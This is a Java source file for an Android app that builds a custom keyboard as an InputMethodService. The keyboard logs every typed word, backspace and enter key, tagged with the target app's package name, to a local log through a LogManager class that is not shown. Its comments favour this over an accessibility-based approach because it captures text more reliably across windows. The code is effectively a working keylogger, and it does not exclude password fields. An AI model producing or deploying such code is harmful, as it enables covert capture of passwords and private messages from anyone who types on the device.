package com.keyrecord.app;

import android.content.Context;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.inputmethodservice.InputMethodService;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethodManager;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.Locale;

/**
 * Built-in keyboard (InputMethodService). Every key the user types is
 * captured and written locally via LogManager at the moment it is committed,
 * which is far more reliable and real-time than the accessibility route
 * (it also works in floating windows / split screen).
 */
public class TraceInputMethod extends InputMethodService {

    private static final long WORD_FLUSH_DELAY_MS = 900;

    private LogManager logManager;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private LinearLayout keyboardView;
    private boolean shifted = false;
    private boolean symbols = false;

    private final StringBuilder wordBuffer = new StringBuilder();
    private final Runnable flushRunnable = this::flushWord;

    @Override
    public void onCreate() {
        super.onCreate();
        logManager = LogManager.getInstance(this);
    }

    @Override
    public View onCreateInputView() {
        keyboardView = new LinearLayout(this);
        keyboardView.setOrientation(LinearLayout.VERTICAL);
        keyboardView.setBackgroundColor(color(R.color.ime_bg));
        int pad = dp(6);
        keyboardView.setPadding(pad, dp(8), pad, dp(10));
        rebuild();
        return keyboardView;
    }

    @Override
    public void onFinishInputView(boolean finishingInput) {
        flushWord();
        super.onFinishInputView(finishingInput);
    }

    // ------------------------------------------------------------------ build

    private void rebuild() {
        keyboardView.removeAllViews();
        if (symbols) {
            addRow("1234567890", 1f, false);
            addRow("@#$%&-+()", 1f, false);
            addRow("=\"*':;!?", 1f, false);
        } else {
            addRow("qwertyuiop", 1f, false);
            addRow("asdfghjkl", 1f, false);
            addSideRow("zxcvbnm");
        }
        addBottomRow();
    }

    private void addRow(String keys, float keyWeight, boolean narrow) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(46));
        rowLp.topMargin = dp(4);
        for (int i = 0; i < keys.length(); i++) {
            row.addView(makeKey(String.valueOf(keys.charAt(i)), keyWeight, false));
        }
        keyboardView.addView(row, rowLp);
    }

    /** Letter third row: [shift] z..m [backspace]. */
    private void addSideRow(String keys) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(46));
        rowLp.topMargin = dp(4);
        row.addView(makeKey("\u21E7", 1.5f, true)); // shift
        for (int i = 0; i < keys.length(); i++) {
            row.addView(makeKey(String.valueOf(keys.charAt(i)), 1f, false));
        }
        row.addView(makeKey("\u232B", 1.5f, true)); // backspace
        keyboardView.addView(row, rowLp);
    }

    private void addBottomRow() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(46));
        rowLp.topMargin = dp(4);

        row.addView(makeKey(symbols ? "ABC" : "\uFF1F123", 1.5f, true)); // page toggle
        row.addView(makeKey(",", 1f, false));
        row.addView(makeKey(getString(R.string.ime_space), 4f, false)); // space
        row.addView(makeKey(".", 1f, false));
        row.addView(makeKey(getString(R.string.ime_switch), 1.5f, true)); // switch IME
        row.addView(makeKey("\u21B5", 1.5f, true)); // enter
        keyboardView.addView(row, rowLp);
    }

    private TextView makeKey(String label, float weight, boolean special) {
        final TextView key = new TextView(this);
        key.setText(shifted && !symbols ? label.toUpperCase(Locale.ROOT) : label);
        key.setGravity(Gravity.CENTER);
        key.setMaxLines(1);
        key.setTextSize(special || label.length() > 2 ? 14 : 18);
        key.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        key.setTextColor(color(R.color.ime_key_text));
        key.setBackground(special
                ? rounded(R.color.ime_key_special, 10)
                : rounded(R.color.ime_key_bg, 10));

        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.MATCH_PARENT, weight);
        lp.leftMargin = dp(3);
        lp.rightMargin = dp(3);
        key.setLayoutParams(lp);

        key.setOnClickListener(v -> onKey(label));
        return key;
    }

    // ------------------------------------------------------------------ input

    private void onKey(String label) {
        switch (label) {
            case "\u21E7": // shift
                shifted = !shifted;
                rebuild();
                return;
            case "\u232B": // backspace
                handleBackspace();
                return;
            case "\u21B5": // enter
                flushWord();
                record("[\u21B5]");
                commitText("\n");
                return;
            default:
        }

        if (label.equals("ABC") || label.equals("\uFF1F123")) { // page toggle
            symbols = !symbols;
            rebuild();
            return;
        }
        if (label.equals(getString(R.string.ime_switch))) { // pick another IME
            flushWord();
            InputMethodManager imm =
                    (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (imm != null) {
                imm.showInputMethodPicker();
            }
            return;
        }
        if (label.equals(getString(R.string.ime_space))) {
            flushWord();
            commitText(" ");
            return;
        }

        String out = (shifted && !symbols) ? label.toUpperCase(Locale.ROOT) : label;
        wordBuffer.append(out);
        scheduleFlush();
        if (shifted && !symbols) {
            shifted = false;
            rebuild();
        }
    }

    private void handleBackspace() {
        flushWord();
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) {
            ic.deleteSurroundingText(1, 0);
        }
        record("[\u232B]");
    }

    private void commitText(String text) {
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) {
            ic.commitText(text, 1);
        }
    }

    // ------------------------------------------------------- word aggregation

    private void scheduleFlush() {
        handler.removeCallbacks(flushRunnable);
        handler.postDelayed(flushRunnable, WORD_FLUSH_DELAY_MS);
    }

    /** Writes buffered consecutive characters as one readable entry. */
    private void flushWord() {
        handler.removeCallbacks(flushRunnable);
        if (wordBuffer.length() == 0) {
            return;
        }
        String word = wordBuffer.toString();
        wordBuffer.setLength(0);
        commitText(word);
        record(word);
    }

    private void record(String text) {
        EditorInfo info = getCurrentInputEditorInfo();
        String pkg = (info != null && info.packageName != null)
                ? info.packageName : "unknown";
        logManager.appendEntry(pkg, text);
    }

    // ------------------------------------------------------------------ utils

    private GradientDrawable rounded(int colorRes, int radiusDp) {
        GradientDrawable d = new GradientDrawable();
        d.setColor(color(colorRes));
        d.setCornerRadius(dp(radiusDp));
        return d;
    }

    private int color(int res) {
        return getResources().getColor(res, getTheme());
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }
}
